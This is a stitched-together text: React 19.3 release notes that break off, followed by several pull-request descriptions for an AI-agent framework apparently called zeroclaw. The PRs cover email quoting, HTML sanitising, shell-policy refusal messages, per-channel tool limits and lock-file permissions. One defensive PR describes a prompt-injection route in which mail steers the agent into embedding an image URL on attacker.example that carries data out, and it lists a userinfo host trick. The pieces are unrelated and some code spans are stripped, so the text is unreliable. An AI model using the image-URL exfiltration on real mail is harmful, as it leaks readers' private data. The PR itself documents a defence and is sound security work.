Below is a list of all new features, APIs, and bug fixes.

Read the React 19.3 release post for more information.

New React Features

  • <ViewTransition />: Adds <ViewTransition /> and addTransitionType APIs to power View Transition animations in React (@​sebmarkbage, @​jackpope, @​gaearon: #31975, #31987, #31996, #31999, #32001, #32002, #32028, #32029, #32031, #32034, #32038, #32041, #32050, #32090, #32105, #32254, #32379, #32422, #32462, #32540, #32545, #32585, #32599, #32611, #32612, #32617, #32651, #32653, #32656, #32664, #32699, #32723, #32734, #32751, #32752, #32760, #32761, #32764, #32772, #32790, #32819, #32820, #32822, #32833, #32849, #33094, #33191, #33200, #33206, #33293, #33330, #33331, #33332, #33357, #33362, #33433, #33576, #34374, #34450, #34481, #34500, #34502, #34510, #34511, #34539, #35567, #35564, #35485, #35380, #35063, #35060, #34676, #36917, #35337, #35520)
  • Fragment Refs: Add Refs to <Fragment /> to support composable platform behavior (@​jackpope, @​sebmarkbage, @​eps1lon, @​Dhakshin2007, @​chirokas, @​teamleaderleo, @​fallintoplace: #32465, #32613, #32619, #32654, #32660, #32682, #32722, #32813, #32814, #33056, #33058, #33093, #34069, #34103, #34544, #34545, #37062, #37061, #37060, #36047, #36010, #35642, #35641, #35637, #35630, #34935, #37457, #37408, #37326, #37251, #37171, #37169, #37168, #37167, #37166, #37165, #37164, #37163, #37162, #37161, #37160, #37125, #37063)

New React DOM Features

  • browser(): a new react-dom API that returns a usable which errors during server rendering and resolves in the browser. use(browser()) inside a <Suspense> boundary marks a subtree as browser-only without reporting a recoverable error (@​gnoff: #37143, #37241)
    • Added an onBrowserBailout option to the react-dom/server APIs to observe when a subtree defers to the browser (@​gnoff #37193)

Notable changes

  • Enable Trusted Types API integration (@​rickhanlonii #35816)
  • Transitions now render independently instead of being entangled into a single render, so a slow transition no longer holds up unrelated ones (@​acdlite #37290)
  • Added a DEV-only warning when a component appears to have been unblocked by calling use() conditionally (@​hoxyq, @​eps1lon: #37104, #37203, #37491)

All Changes

React

  • Fast Refresh Fixes
    • Fix Fast Refresh to find and remount edits to components wrapped behind lazy() (@​sophiebits #36965)
    • Fix Fast Refresh so edits to a memo() comparison function take effect (@​sophiebits #36964)
    • Fix Fast Refresh crash when an edit changes the kind of a component's type (@​sophiebits #36963)
    • Unify hot reload type resolution for Fast Refresh (@​sophiebits #36962)
    • Fix Fast Refresh to remount correctly when an edit changes the component kind (@​sophiebits #36950)
    • Double invoke effects in StrictMode after Fast Refresh (@​eps1lon #35962)
  • Performance Track Fixes
    • Prevent crash when accessing $$typeof in Performance Tracks (@​eps1lon #35679)
    • Handle non-string function names in Performance Tracks (@​eps1lon #35659)
    • Use minus (-) instead of en dash for removed props in Performance Tracks (@​eps1lon #35649)
    • Handle arrays with bigints in deep objects in Performance Tracks (@​eps1lon #35648)
    • Don't enumerate typed array props in Performance Tracks in DEV (@​UditDewan #36913)
    • Bail out of diffing wide objects and arrays in Performance Tracks (@​eps1lon #34742)
    • Clear potentially large performance measures in DEV (@​hoxyq #34803)
    • Fix missing else branch for renders with no props change in Performance Tracks (@​hoxyq #34837)
  • Activity Fixes
    • Fix useSyncExternalStore missing store mutations that happened while an Activity tree was hidden (@​sophiebits #36947)
    • Hide portal contents when an Activity is hidden (@​acdlite #35091)
    • Prevent metadata hoisting in hidden <Activity> trees (@​ronnakamoto #34983)

prs.title: feat(channels/email): quote the original message in replies
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - New per-channel flag `quote_original` on `[channels.email.<alias>]`, off by default. When it is on, a reply to a message the channel received quotes that message below the agent's text, the way mail clients do: an `On <date>, <sender> wrote:` line, then the original as `>` lines in the plain part and as a `<blockquote>` in the HTML part, HTML-escaped. Replies already thread through `In-Reply-To` / `References`, but the body was only the agent's text, so the reader had nothing under the answer.
  - The quote is what the channel itself parsed from the inbound message: sender display name, `Date` and body text. It's held in a bounded in-memory map keyed by Message-ID: 256 messages, oldest dropped first, each quote capped at 20,000 characters on a char boundary. The map is filled in `dispatch_email` after the allowlist and duplicate checks, so a blocked sender's mail is never stored.
  - It deliberately doesn't use `ChannelMessage.content`, which the runtime may have enriched by the time `SendMessage::reply_to` runs, and it doesn't add a field to the channel-neutral `SendMessage`.
- **Scope boundary:**
  - No CC or reply-all; that's #9506.
  - No quoting across restarts: a reply to a message received before the daemon restarted goes out without a quote, and the docs say so.
  - The original's HTML is not quoted verbatim; the quote is built from the parsed text.
  - `send_via`, cron announcements and other non-reply sends are unchanged. `build_email_message` is the only place that builds outbound email bodies, and Gmail push sends through the IMAP+SMTP channel.
- **Blast radius:** `zeroclaw-config` (one `EmailConfig` field) and `zeroclaw-channels` (`email_channel.rs`). No API or orchestrator change. With the flag off, the outbound plain and HTML bodies are exactly what they are today. Several open email-channel PRs also edit `email_channel.rs` (#11746, #11748, #11750, #11752, #11762, #11763); whichever lands second rebases, and this change sits in its own functions to keep that small.
- **Linked issue(s):** Closes #11938. Related #9506

### What this does, simply

When an assistant answers an email, the reply now can look like a normal email reply: the assistant's answer on top, and the message it's answering quoted underneath. Without it, someone reading "yes, done" has to dig through their sent folder to see what it refers to. It's a switch per mailbox and off unless you turn it on. Only messages the assistant received since it last started can be quoted.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. The tests drive a raw email through dispatch and `SendMessage::reply_to` to the sent message, which is the path a live reply takes.

### How I tested

- **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-channels` and `zeroclaw-config`; Docs for the markdown change.
- **Known CI coverage gap, if any:** `markdownlint-cli2` couldn't run locally (no Node); the docs-quality gate's em-dash check passed and CI's docs job covers the lint.
- **Commands run and tail output:**

```text
cargo fmt --all -- --check                                                    ok
cargo test -p zeroclaw-config --lib -- generated_config_fields_keep_operator_descriptions
  test result: ok. 1 passed; 0 failed
cargo test -p zeroclaw-channels --lib -- email_channel
  test result: ok. 81 passed; 0 failed
cargo clippy -p zeroclaw-config -p zeroclaw-channels --tests --no-deps -- -D warnings   ok
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-channels -p zeroclaw-config  ok
bash scripts/ci/comment_hygiene_gate.sh                                        passed
```

- **Beyond CI, what did you manually verify?** New tests:
  - the flag defaults off
  - the exact plain and HTML shape of a quoted reply, with HTML escaping
  - a reply without a `Date` still names the sender
  - no quote when the flag is off, the message is unknown, or the send has no `in_reply_to`
  - the quote is present in the sent message's wire form
  - a raw email through `dispatch_email` and `SendMessage::reply_to` produces the quote
  - a blocked sender's mail is never stored
  - eviction past 256 messages
  - the 20,000-character cut lands on a char boundary

  Not verified: a live reply on this branch.
- **Visual interface evidence:** N/A (mail body text; the tests assert the exact plain-text output and the HTML structure).

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No (fixtures use `example.invalid`)
- Prompt injection or untrusted model-visible text introduced/changed? No. The quoted text goes only into the outbound mail; it is never fed back to the model. The original is HTML-escaped in the HTML part.

## Compatibility (required)

- Backward compatible? Yes
- Config / env / CLI surface changed? Yes: one optional key, `quote_original`, default `false`. Existing configs are unaffected.
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

Low risk: set `quote_original = false`, or `git revert <sha>`.

prs.title: fix(channels/email): build the HTML part from Markdown structure only
prs.body:
## Summary - **Base branch:** `master` - **What changed and why:** - The email channel's HTML part is built from Markdown structure only. `markdown_to_html` now filters `pulldown-cmark`'s events before rendering: - Raw inline HTML is dropped, keeping the text between tags; `
` becomes a line break. - A raw HTML block is rendered as text. - An image is kept only for an inline attachment (`cid:`) or an `https` URL whose host is on the channel's new `html_image_domains`, which also covers subdomains. Any other image is reduced to its alt text. - A link is kept only for `http`, `https`, `mailto` and `tel`. Any other target is reduced to the link text. - Why: the agent's text can be steered by the mail it answers, and until now raw HTML and arbitrary image URLs went into the HTML part unchanged. A remote image is fetched by the reader's mail client, so an injected `![](https://attacker.example/p.png?d=...)` or `` was a way to send data out. - **Scope boundary:** - The plain-text part is unchanged (the agent's text as written; mail clients fetch nothing from it). - Inbound handling is unchanged. - No new dependency: the filter runs on the parser's event stream, and `push_html` still does the escaping. - Agent-written HTML bodies and operator templates are proposed separately in #11992. - **Blast radius:** the HTML part of every message the IMAP+SMTP email channel sends. Markdown output (headings, emphasis, lists, tables, code, safe links) is unchanged. What changes is raw HTML in the agent's text and images from unlisted hosts. - **Linked issue(s):** Closes #11991. Related #11992 ### What this does, simply When the assistant replies by email, its text is turned into a formatted email. Until now, any HTML or image link in that text went out as-is. If someone tricked the assistant with an email, they could make it add an invisible image whose web address carries private information, and the reader's mail program would send it to them when loading the image. Now only formatting comes through. Images are allowed only if they're attached to the email or hosted on sites the operator lists, and odd links are reduced to plain text. ## Testing (required) ### How you can test (when useful) - **Reviewer testing requested?** N/A. The unit tests cover each rule, plus one sent message end to end. ### How I tested - **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-channels` and `zeroclaw-config`; Docs for the markdown change. - **Known CI coverage gap, if any:** `markdownlint-cli2` can't run on my machine (no Node); CI's docs job covers it. - **Commands run and tail output:** ```text cargo fmt --all -- --check ok cargo test -p zeroclaw-config --lib -- generated_config_fields_keep_operator_descriptions test result: ok. 1 passed; 0 failed cargo test -p zeroclaw-channels --lib -- email_channel test result: ok. 80 passed; 0 failed cargo clippy -p zeroclaw-config -p zeroclaw-channels --tests --no-deps -- -D warnings ok RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-channels -p zeroclaw-config ok bash scripts/ci/comment_hygiene_gate.sh passed ``` - **Beyond CI, what did you manually verify?** New tests: - raw inline HTML dropped with its text kept - `
` becomes a line break - a raw HTML block shown as text - remote images reduced to alt text: an unlisted host, `http` on a listed host, a look-alike host, a userinfo trick (`https://listed@attacker/`) and `data:` - listed hosts, their subdomains and `cid:` kept; no list means `cid:` only - `javascript:` links reduced to text while `https` links stay - tables and emphasis still render - a sent message carries no `` in its HTML part Negative check: with the previous `markdown_to_html` restored, 7 of the 8 new tests fail. The eighth, tables and emphasis, passes both ways, since that behaviour doesn't change. Not verified: a live send on this branch. - **Visual interface evidence:** N/A (mail HTML structure; the tests assert the rendered markup). ## Security & Privacy Impact (required) - New permissions, capabilities, or file system access scope? No - New external network calls? No. This removes a path by which outbound mail made the reader's client fetch arbitrary URLs. - Secrets / tokens / credentials handling changed? No - PII, real identities, or personal data in diff, tests, fixtures, or docs? No - Prompt injection or untrusted model-visible text introduced/changed? No. This limits what model-written text can put in outbound HTML. ## Compatibility (required) - Backward compatible? Mostly. Markdown renders as before. Raw HTML in the agent's text is no longer sent as markup, and remote images need their host on `html_image_domains`. - Config / env / CLI surface changed? Yes: one optional key, `html_image_domains` on `[channels.email.]`, empty by default. - Rust/MSRV/toolchain floor changed? No ## Rollback (required for medium/high-risk PRs) Low risk: `git revert `. - **Observable failure symptoms:** an expected image showing as its alt text means its host is not on `html_image_domains`.

prs.title: feat(security): explain shell policy refusals with reason and remediation hint
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:** a refused shell command returned a bare `Command not allowed by security policy: <cmd>` string. The message told an agent *that* it was refused but not *why* or *what to do*, so the rational-seeming response was retrying variations of the same command. In production observation, compound-command retry loops burned up to ~25% of a turn's tool calls before the iteration cap killed the turn. This PR appends a compact `reason: ...; hint: ...` suffix classifying the refusal at the two allowlist refusal sites: compound commands get a decomposition hint (one command per invocation; `git -C <path> <subcmd>` instead of `cd <path> && git ...`), an unknown base command gets an allowlist hint (use file_read/glob_search/content_search, or ask the operator to allowlist it).
- Hints are attached only when the refusal site can classify the cause; PowerShell refusals outside the bounded grammar stay unhinted rather than guessed. The message prefix is unchanged — existing consumers and tests matching on it keep working.
- **Scope boundary:** message text only; no behavior, policy, or API change. Compound commands with all segments allowlisted remain permitted (documented existing behavior).
- **Blast radius:** callers that parse the refusal string beyond the documented prefix. Grep found none; the prefix contract is preserved and covered by existing tests.
- **Linked issues:** none.

### What this does, simply

When the shell policy refuses a command, the error now explains itself. An agent that tries `cd /tmp && ls` learns it was refused because the command is compound and is told to run one command at a time — instead of silently burning four more attempts on `cd /tmp & ls`, `cd /tmp; ls`, and so on.

## Testing (required)

- **Reviewer testing requested?** N/A — behavior change is an error-string enrichment; examples below are from the new unit tests.
- **CI checks relied on and why they cover this change:** required CI (Test, Lint, Format, clippy) — touches `zeroclaw-config` policy, covered by the workspace matrix.
- **Known CI coverage gap, if any:** none known.
- **Commands run and tail output:**
  ```sh
  cargo fmt -- --check                 # clean
  cargo check -p zeroclaw-config       # exit 0 (two pre-existing warnings unrelated to the diff)
  cargo test -p zeroclaw-config --lib refusal_hint   # 3/3 new tests pass
  cargo test -p zeroclaw-config --lib                # 1776 passed, 1 failed
  ```
  The single failure (`platform::native::tests::powershell_full_scripts_execute_with_native_semantics`) reproduces on clean `origin/master` via `git stash` — a pre-existing Windows console-encoding environment issue, unrelated to this diff.
- **Beyond CI, what did you manually verify?** Refusal message shape on the three refusal classes (compound, unknown command, argument-safety refusal without a misleading hint). Not verified: full workspace test run and clippy `--all-targets` (per task scope).
- **Visual interface evidence:** exact plain-text output (noninteractive CLI error text):
  ```
  cd /tmp && ls
  → Command not allowed by security policy: cd /tmp && ls | reason: compound command; hint: one command per invocation - run them separately (e.g. 'git -C <path> <subcmd>' instead of 'cd <path> && git ...')

  frobnicator -x
  → Command not allowed by security policy: frobnicator -x | reason: 'frobnicator' is not in the allowed command list; hint: use an allowed tool (file_read/glob_search/content_search) or ask the operator to allowlist 'frobnicator'
  ```
- **Tested revision, interface, and evidence path:** revision on branch `fix/policy-refusal-remediation`; evidence: unit test output in `crates/zeroclaw-config/src/policy.rs` (`refusal_hint_*` tests).
- **If any command was intentionally skipped, why:** full-workspace `cargo test` / `clippy --all-targets` — the crate-local suite covers the changed surface; the rest runs in required CI.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? **No**
- New external network calls? **No**
- Secrets / tokens / credentials handling changed? **No**
- PII, real identities, or personal data in diff, tests, fixtures, or docs? **No**
- Prompt injection or untrusted model-visible text introduced/changed? **No** — the hint text is static and emitted by the runtime; the refused command echo is pre-existing behavior.

## Compatibility (required)

- Backward compatible? **Yes** — error text grows a suffix; the documented prefix is unchanged.
- Config / env / CLI surface changed? **No**
- Rust/MSRV/toolchain floor changed? **No**

## Rollback

`git revert <sha>` — single-commit change confined to `crates/zeroclaw-config/src/policy.rs` plus tests.

prs.title: fix(channels): honour a channel instance's excluded_tools
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - `ChannelsConfig::excluded_tools_for(channel, alias)` reads the `excluded_tools` list of a channel instance. `channel` is the runtime kind (`voice-call`) or the config key (`voice_call`). It covers every channel type listed by `ChannelsConfig::channels()`. Twitch and plugin channels have no such field and return an empty list; an unknown type returns `None`.
  - In the orchestrator, one helper, `channel_turn_excluded_tools`, computes a turn's excluded tools: the risk profile's list (lifted for CLI turns and `Full` autonomy, exactly as before) plus the list of the instance the message arrived through. Both places that built the per-turn list now use it, so the channel's list reaches the native tool specs, tool execution and the skills section, the same as the profile's.
  - Until now the per-channel setting was documented (channels overview table, security/autonomy.md) and present on every channel config, but nothing read it.
  - The restriction also follows the work a turn starts. It travels with the task (`security::channel_restriction`, modelled on the SOP step scope), and every tool loop merges it into its excluded tools in `run_tool_call_loop_impl`. So a bounded delegate, a sub-agent or an inline `cron_run` launched from a restricted channel can't use what the channel excludes, whatever tool set it assembles. Background and parallel delegation capture it before the spawn and restore it inside.
  - Work the restriction can't follow is refused on a channel that sets `excluded_tools`: cron and scheduled jobs, SOP steps, peer and A2A messages, external agent CLIs, and `execute_pipeline`. The new `[channels] restricted_channels_allow_detached_work = true` allows it again.
- **Scope boundary:**
  - The channel's own list applies at every autonomy level, including `Full`. It's an explicit restriction on that channel, not part of the risk profile; autonomy.md now says so.
  - A message that names no instance gets the union of all instances of its type, so it is never less restricted than the strictest instance.
  - The agent's startup prompt tool list is built once per agent and is not per channel, so in text-protocol tool mode an excluded tool can still be described there. It's still neither offered as a native spec nor executable.
  - No change to risk profiles, approvals or peer groups.
- **Blast radius:** channel turns of any agent whose channel instances set `excluded_tools`. Configs that don't set it behave exactly as before.
- **Linked issue(s):** Closes #11989

### What this does, simply

Each chat or mail channel has a setting to hide certain tools from the assistant when it answers on that channel, for example "no web requests on the public inbox". The setting was documented but did nothing. Now it works. It adds to the agent's usual restrictions and applies even to an agent that otherwise has full autonomy.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. The unit tests cover the lookup across every channel type and the merge used by both per-turn call sites.

### How I tested

- **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-config` and `zeroclaw-channels`.
- **Known CI coverage gap, if any:** None.
- **Commands run and tail output:**

```text
cargo fmt --all -- --check                                                         ok
cargo test -p zeroclaw-config --lib -- every_listed_channel_type_answers_excluded_tools channel_excluded_tools_are_read_per_instance
  test result: ok. 2 passed; 0 failed
cargo test -p zeroclaw-channels --lib -- a_channel_turn_drops_the_tools a_channel_exclusion_holds assemble_channel_agent_tools excluded
  test result: ok. 12 passed; 0 failed
cargo clippy -p zeroclaw-config -p zeroclaw-channels --tests --no-deps -- -D warnings    ok
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-channels -p zeroclaw-config   ok
bash scripts/ci/comment_hygiene_gate.sh                                             passed
```

- **Beyond CI, what did you manually verify?** New tests:
  - `every_listed_channel_type_answers_excluded_tools`: every kind and config key from `channels()` has a lookup arm, so a new channel type without one fails this test.
  - `channel_excluded_tools_are_read_per_instance`: per-instance lists, an unknown alias, and the union without an alias.
  - `a_channel_turn_drops_the_tools_its_channel_excludes`: profile plus channel list for the right instance only, and not for another channel type.
  - `a_channel_exclusion_holds_at_full_autonomy_and_without_an_alias`.
  - `a_restricted_channel_refuses_detached_work_unless_allowed` and `a_loop_started_from_a_restricted_turn_inherits_the_restriction`.
  - `security::channel_restriction` tests: no restriction outside a channel turn, merge into a loop's exclusions, a captured restriction surviving a spawn.
  - The existing `delegate`, `spawn_subagent` and SOP scope tests (291 in the filtered runtime run) still pass.

  Not verified: a live channel turn on this branch.
- **Visual interface evidence:** N/A

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No. It only removes tools from channel turns.
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No
- Prompt injection or untrusted model-visible text introduced/changed? No. This narrows what a turn from an untrusted channel can do, which is the mitigation the setting was documented to provide.

## Compatibility (required)

- Backward compatible? Yes for configs that don't set the field. A config that already sets per-channel `excluded_tools` now gets the restriction it asked for.
- Config / env / CLI surface changed? Yes: an existing field starts working, and one new optional key, `[channels] restricted_channels_allow_detached_work` (default `false`).
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

Low risk: `git revert <sha>`, or remove the per-channel `excluded_tools` entries.

- **Observable failure symptoms:** a tool missing on a channel that should have it would mean a per-channel `excluded_tools` entry is listing it.

prs.title: fix(config): move the lifecycle lock into an owner-only data/.lifecycle directory
prs.body:
## Summary

- **Base branch:** `master` (all contributions)
- **What changed and why:**
  - #10621 applies an owner-only check (`mode & 0o022 == 0`) to the whole configurable data directory, and both places that create that directory (`ConfigOwnershipGuard::acquire` and `Config::load_or_init`) use a plain `create_dir_all` that takes the process umask. Under umask `0002`, which Linux distributions commonly set for user-private groups, `data/` is created `0775` and `zeroclaw daemon` then refuses the directory it just made: `config lifecycle directory .../.zeroclaw/data is writable by other users (mode 775)`. The same refusal hits an existing `0775` `data/` left by v0.8.5, which never checked it.
  - The lock now lives in `data/.lifecycle/config-lifecycle.lock`. ZeroClaw creates `.lifecycle` itself with mode `0o700` whatever the umask, and the existing strict checks (owned by the current user, no group or other write, lock file `0600` opened with `O_NOFOLLOW`) apply to that subdirectory and its lock. `.lifecycle` is now inspected with `lstat`, so a symlink or other non-directory in its place is refused. These checks protect the lock against other users who cannot write the data directory or its parents.
  - The data directory is the operator's again: the guard accepts an existing one as it is, as in v0.8.5 and as on Windows. A data directory ZeroClaw creates, from either the guard or `Config::load_or_init`, is created `0o700` through one shared helper, `zeroclaw_config::schema::create_owner_only_dir`. Missing parents keep the default mode, and the helper never chmods an existing directory. (The daemon's IPC endpoint setup, unchanged here and also in v0.8.5, still sets `data/` to `0700` when the socket lives there.)
  - A `.lifecycle` that fails the checks gets a refusal through Fluent. It names the path and gives the exact shell-quoted `chmod 700`, `sudo chown -R` or `rm` command on a line of its own. ZeroClaw does not repair these states itself, because only tampering, a sudo run or a filesystem without Unix permissions produces them. The owner refusals depend on who is running:
    - **Owned by root** (usually an earlier run with sudo): run ZeroClaw as the user, not with sudo, and give the directory back with `sudo chown -R <user> <path>`. Other files written during that run may belong to root too.
    - **ZeroClaw itself running as root** on the user's `.lifecycle`: run ZeroClaw as that user, without sudo. There is no chown command, because handing the directory to root would only break the next run without sudo.
    - **Owned by another user, or by a uid with no name:** the `chown` remedy comes first, after a reminder to check the contents (`chown -R` also hands over anything another user hard-linked into it; `.lifecycle` holds only `config-lifecycle.lock`, with a link count of 1). Running as the owner is the alternative.
    - The group/other-writable, root-owner and foreign-owner refusals end with: if `chmod` or `chown` has no effect, the data directory is on a filesystem that does not keep Unix permissions, so point `data_dir` at a local filesystem. With that sentence after those commands, and a closing sentence on the data-directory refusals below, an OS error printed after a message can never land on a command line. Only the not-a-directory refusal ends with its command, and it never carries an OS error.
  - If ZeroClaw cannot create `.lifecycle` because the data directory belongs to someone else, a refusal of its own now explains it. Without it, moving the lock into `.lifecycle` would leave only `creating config lifecycle directory …: Permission denied (os error 13)`. (Master fails differently here: a root-owned data directory passes `create_dir_all` and then fails its owner check, `config lifecycle directory … is owned by uid 0, not the current user`.) The OS error stays attached as the cause. A symlinked data directory is followed, and the refusal names the directory it resolves to, since `chown -R` does not follow a symlink operand. The data directory may belong to another account or a service on purpose, so the advice differs from `.lifecycle`'s:
    - **Owned by root:** if an earlier run with sudo created it, give it back with `sudo chown -R <user> <data>`; if it belongs to root on purpose, run ZeroClaw as its owner or point `data_dir` elsewhere.
    - **Owned by another user:** run ZeroClaw as that user or point `data_dir` at a directory of your own; the `chown` is offered only if the directory really is yours.
    - **ZeroClaw running as root:** run ZeroClaw as the owner, without sudo.
- **Scope boundary:** No change to the lock-file checks or messages, the cross-process locking protocol, the IPC endpoint's own lock (`rpc/local.rs`), or Windows behavior beyond the lock's new path. No check of any kind on the data directory's mode or owner; the data directory is inspected only to explain a refusal the OS already made. No migration of the old lock path: nothing outside the guard reads `config-lifecycle.lock` (tests that simulate the pre-load lock in `zeroclaw-config` move to the new path). v0.8.6 shipped the old path, so a v0.8.6 process and a process from this branch do not exclude each other; Compatibility and the release note below cover the upgrade.
- **Blast radius:** Every command that takes config ownership: `zeroclaw daemon`, standalone `zeroclaw agent` and `zeroclaw acp`, the gateway, and offline agent mutations in `alias_cli`. `Config::load_or_init` now creates a missing `data/` as `0o700`, which affects every command on a fresh install. `shell_escape` in `tools/coding_cli_executor.rs` becomes `pub(crate)` so the remedy commands share its quoting.
- **Linked issue(s):** Related #10621. Follow-up: #11952 (leading-dash paths in the printed repair commands).
- **Release note:** The daemon no longer refuses a group-writable data directory, such as one created under umask `0002`, so the v0.8.6 `chmod go-w` workaround is no longer needed. The config lifecycle lock moves from `data/config-lifecycle.lock` to `data/.lifecycle/config-lifecycle.lock`, so v0.8.6 and v0.8.7 processes do not exclude each other. When upgrading from v0.8.6, stop any running `zeroclaw daemon`, `zeroclaw agent` or `zeroclaw acp` before installing v0.8.7, then start it again. The old `data/config-lifecycle.lock` is ignored and can be deleted once no v0.8.6 process is running.

### What this does, simply

ZeroClaw takes a lock file before the daemon loads its config, so two processes cannot change the config at the same time. The change that added that lock, which shipped in v0.8.6, also required the whole data folder to be closed to other users, while creating that folder with whatever default permissions the user's shell had. On many Linux systems those defaults let the user's group write, so on a fresh install the daemon created the folder and then refused to start because of it. People upgrading from v0.8.5 with such a folder are locked out the same way.

This PR keeps the lock in a small private folder, `data/.lifecycle`, that ZeroClaw creates for itself as owner-only. Only that folder and the lock inside it get the strict checks. The data folder is accepted as it is, just as v0.8.5 accepted it, though a new one is still created private. If someone changes or replaces the private folder, ZeroClaw stops and prints the exact command that fixes it instead of changing permissions itself.

### Known limitations

- **Filesystems that do not keep Unix permissions.** On WSL `/mnt/c` (drvfs without the `metadata` option), Docker Desktop bind mounts from a Windows host, CIFS mounts with `dir_mode=0777`, FAT or exFAT mounted with `umask=000`, and NFSv4 with an id-mapping mismatch (owner shown as `nobody`), `.lifecycle` can report a fixed mode or owner that `chmod` and `chown` cannot change. ZeroClaw then refuses to start with a remedy that has no effect; the message says so and suggests pointing `data_dir` at a local filesystem. Master refuses these setups too, and v0.8.5 ran on them at least for commands that do not bind the IPC socket.
- **Users who can write the data directory or its parents.** The checks on `.lifecycle` and the lock protect the lock only against other users who cannot write the data directory or any directory above it. A user who can write `data/` can rename `.lifecycle` aside, which splits the lock (the running holder keeps the moved inode and the next process creates a fresh one), or create `.lifecycle` first, which blocks startup. The same applies one level up when `.zeroclaw/` is group-writable under umask `0002` with a shared primary group. Master checked `data/` but nothing above it, so it had the same exposure one level higher. No check on a single directory can close this; #11793 tracks a trust rule for the data root as a whole.
- **ACLs.** The checks read mode bits. ACL entries inherited on macOS, or NFSv4 ACLs, can grant access that the mode bits do not show. Linux POSIX ACLs show up in the group bits and are covered. This is unchanged from master.
- **Check-to-use window.** `.lifecycle` is checked with `lstat` and the lock is then opened by path, so a user who can write `data/` could swap in a link between the two. That gives them nothing the rename above does not, so the `lstat` refusal covers static links (mistakes, links planted in advance) rather than a racing swap.

### Follow-ups (not in this PR)

- Bind the checks to the opened directory (open `.lifecycle` with `O_DIRECTORY | O_NOFOLLOW`, check the handle's metadata, create the lock with `openat`). Optional hardening that closes the check-to-use window; it belongs with the data-root trust rule in #11793.
- Mention macOS and NFSv4 ACLs wherever a mode check is described as closing access (the helper's doc now has a one-line note).
- The V2→V3 migration, and any other path that creates `data/` besides the two sites named above, still uses the umask mode. Harmless today; worth folding into #11793's "create owner-only everywhere".
- Test fixtures that simulate the pre-load lock (`schema.rs`, `schema/v2.rs`, `tests/legacy_plugin_recovery.rs`) create `.lifecycle` and the lock with umask modes. The guard never inspects them, but building them with `create_owner_only_dir` and `0600` would match production.
- `Config::load_or_init` now calls the blocking helper inside an async function where its neighbours use `tokio::fs`; negligible cost. One doc line in a `schema.rs` test runs past the wrap width.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** Yes
- **Interface(s) exercised:** `cli` (`zeroclaw daemon`, `zeroclaw config list`)
- **Setup / preconditions:** Linux, a debug build of `zeroclaw` from each branch, and a throwaway `HOME`. Use a free gateway port so a daemon already on 42617 does not interfere.
- **Steps to run:**
  ```sh
  T=$(mktemp -d); mkdir -p "$T/home"
  ( umask 0002; HOME="$T/home" ZEROCLAW_gateway__port=47641 zeroclaw daemon )   # Ctrl+C once it is serving
  stat -c '%a %n' "$T/home/.zeroclaw/data" "$T/home/.zeroclaw/data/.lifecycle"
  chmod 775 "$T/home/.zeroclaw/data/.lifecycle"
  ( umask 0002; HOME="$T/home" ZEROCLAW_gateway__port=47641 zeroclaw daemon )   # should refuse
  ```
- **Expected on this branch (after):** The first daemon starts and serves. `data` and `data/.lifecycle` are `700` and the lock is `600`. After the `chmod`, the daemon exits 1 with the group/other-writable refusal shown under "Screenshot or exact-output evidence" below, and the mode stays `775`.
- **Prior behavior on `master` (before):** The first daemon exits 1 with `Error: config lifecycle directory <T>/home/.zeroclaw/data is writable by other users (mode 775)`, and `data` is left `775`.

### How I tested

All builds and tests ran locally on Linux (WSL2 Ubuntu, Rust 1.98.0, session umask `0002`), with the umask set explicitly per command. The base is master `ae9b84be07`. The tested diff is the one in this PR.

- **CI checks relied on and why they cover this change:** CI Required Gate passed on df8aa4db84. Required CI (`cargo fmt`, workspace clippy with `ci-all`, the test matrix) covers the changed crates under the runners' own umask. The umask-`0002` behavior is covered by the new tests, which set the umask themselves inside an isolated test subprocess. CI's macOS `platform-tests` job runs the new tests on macOS, which I did not run.
- **Known CI coverage gap, if any:** Master's `Test` and `Parallel Runtime Test` jobs pass at `ae9b84be07` while the `alias_cli` test fails there under umask `0002`, so the runners do not use `0002` and CI could not show this bug. The new subprocess tests close that gap. `root_run_refuses_a_lifecycle_dir_owned_by_another_user` does its work only as root and passes trivially otherwise. I ran it as euid 0 in a user namespace (`unshare --map-root-user --map-auto`), not under real sudo. Windows was not run locally; there the checks are compiled out and only the lock path changes.
- **Commands run and tail output:**
  ```text
  cargo fmt --all -- --check                                                   exit 0
  cargo check --locked -p zeroclaw-config -p zeroclaw-runtime --all-targets   exit 0
  cargo clippy --locked -p zeroclaw-config -p zeroclaw-runtime --all-targets -- -D warnings   exit 0
  (umask 0002) cargo test --locked -p zeroclaw-config                          1909 passed, 0 failed
  (umask 0022) cargo test --locked -p zeroclaw-config                          1909 passed, 0 failed
  (umask 0002) cargo test --locked -p zeroclaw --bin zeroclaw                  543 passed, 0 failed
  (umask 0022) cargo test --locked -p zeroclaw --bin zeroclaw                  543 passed, 0 failed
  (umask 0002) cargo test --locked -p zeroclaw-gateway --lib --tests          662 passed, 0 failed
  (umask 0022) cargo test --locked -p zeroclaw-gateway --lib --tests          662 passed, 0 failed
  (umask 0002) cargo test --locked --no-fail-fast -p zeroclaw-runtime --lib   5746 passed, 3 failed (pre-existing, see below)
  (umask 0022) cargo test --locked --no-fail-fast -p zeroclaw-runtime --lib   5748 passed, 1 failed (pre-existing, see below)
  (umask 0002) cargo test --locked --no-fail-fast -p zeroclaw-runtime --test '*'   14 binaries, 44 passed, 0 failed
